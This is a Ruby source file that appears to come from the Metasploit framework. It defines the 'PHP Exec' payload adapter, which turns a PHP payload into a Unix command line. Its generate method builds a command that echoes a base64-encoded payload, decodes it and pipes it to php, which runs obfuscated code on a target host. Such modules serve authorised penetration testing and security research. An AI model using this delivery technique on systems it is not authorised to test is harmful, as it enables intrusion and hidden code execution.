##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::Adapter

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'PHP Exec',
        'Description' => 'Execute a PHP payload from a command',
        'Author' => ['Spencer McIntyre', 'msutovsky-r7'],
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'License' => MSF_LICENSE,
        'AdaptedArch' => ARCH_PHP,
        'AdaptedPlatform' => 'php'
      )
    )
    register_advanced_options(
      [
        OptString.new('Base64Decoder', [true, 'The binary to use for base64 decodin    g', 'base64-short', %w[base64-short] ])
      ]
    )
  end

  def compatible?(mod)
    if mod.type == Msf::MODULE_PAYLOAD && (mod.class.const_defined?(:CachedSize) && mod.class::CachedSize != :dynamic) && (mod.class::CachedSize >= 120_000) # echo does not have an unlimited amount of space
      return false
    end
    return false if !datastore['Base64Decoder']

    super
  end

  def generate(_opts = {})
    payload = super

    "echo '#{payload}'|base64 -d|exec $(command -v php)"
  end
end
